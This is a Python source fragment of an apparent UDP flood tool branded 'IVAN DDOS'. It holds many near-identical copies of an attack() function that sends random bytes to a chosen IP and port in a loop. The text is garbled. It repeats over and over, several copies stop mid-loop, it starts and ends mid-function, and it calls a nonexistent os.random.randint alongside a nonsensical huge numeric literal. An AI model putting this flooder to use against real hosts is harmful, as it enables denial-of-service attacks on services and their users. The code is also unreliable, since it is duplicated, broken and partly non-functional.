        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
